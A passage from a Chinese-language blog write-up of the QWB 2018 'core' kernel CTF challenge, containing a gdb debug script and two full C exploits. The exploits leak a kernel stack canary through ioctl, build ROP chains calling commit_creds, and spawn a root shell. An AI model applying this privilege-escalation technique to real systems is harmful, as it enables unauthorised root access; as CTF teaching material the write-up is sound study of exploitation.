&#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于只开了kaslr，这道题方法还是蛮多的</p>
<p>从这道题来看，感觉内核态canary感觉按照rsp算比较准，rsp+0x40的位置</p>
<p><img src="/2023/08/14/kernel-rop/image-20230816144106041.png" alt="image-20230816144106041"></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>关掉kaslr调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo gdb -q \</span><br><span class="line">      -ex &quot;file vmlinux&quot;\</span><br><span class="line">    -ex &quot;add-symbol-file core.ko 0xffffffffc0000000 -s .data 0xffffffffc0002000 -s .bss 0xffffffffc0002400&quot;\</span><br><span class="line">    -ex &quot;target remote localhost:1234&quot;\</span><br><span class="line">    -ex &quot;b *(0x159+0xffffffffc0000000)&quot;</span><br><span class="line"><span class="meta prompt_">    # </span><span class="language-bash">-ex <span class="string">&quot;b core_ioctl&quot;</span></span> </span><br></pre></td></tr></table></figure>

<h3 id="commit-creds-amp-init-cred"><a href="#commit-creds-amp-init-cred" class="headerlink" title="commit_creds(&amp;init_cred)"></a>commit_creds(&amp;init_cred)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  save_status();</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">  rop[i++] = init_cred;</span><br><span class="line">  rop[i++] = commit_creds;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/14/kernel-rop/image-20230816162343753.png" alt="image-20230816162343753"></p>
<p><img src="/2023/08/14/kernel-rop/image-20230816161321011.png" alt="image-20230816161321011"></p>
<h3 id="commit-creds-prepare-kernel-cred-NULL"><a href="#commit-creds-prepare-kernel-cred-NULL" class="headerlink" title="commit_creds(prepare_kernel_cred(NULL))"></a>commit_creds(prepare_kernel_cred(NULL))</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff8106a6d2: mov rdi, rax; jmp rdx; </span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  save_status();</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = prepare_kernel_cred;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff810a0f49</span> + bias; <span class="comment">// pop rdx; ret</span></span><br><span class="line">  rop[i++] = commit_creds;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff8106a6d2</span> + bias;<span class="comment">//mov rdi, rax; jmp rdx; </span></span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/14/kernel-rop/image-20230816174130879.png" alt="image-20230816174130879"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88process-descriptor%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">进程描述符（process descriptor）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">2.</span> <span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-core"><span class="toc-number">3.</span> <span class="toc-text">强网杯 2018 - core</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.1.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">启动脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-ko"><span class="toc-number">3.3.</span> <span class="toc-text">core.ko</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">3.4.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commit-creds-amp-init-cred"><span class="toc-number">3.5.</span> <span class="toc-text">commit_creds(&amp;init_cred)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commit-creds-prepare-kernel-cred-NULL"><span class="toc-number">3.6.</span> <span class="toc-text">commit_creds(prepare_kernel_cred(NULL))</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/14/kernel-rop/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&text=Kernel Rop"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&is_video=false&description=Kernel Rop"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Kernel Rop&body=Check out this article: https://grxer.gitee.io/2023/08/14/kernel-rop/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&name=Kernel Rop&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/14/kernel-rop/&t=Kernel Rop"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    bxz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
